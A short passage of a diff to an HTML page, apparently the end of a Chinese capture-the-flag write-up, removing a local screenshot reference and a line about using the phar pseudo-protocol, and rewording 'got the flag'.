-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240607203657813.png" alt="image-20240607203657813"></p>
-<p>之后通过phar伪协议查看即可</p>
-<p>拿到flag</p>
+<p>得到flag</p>
 
     </div>
     
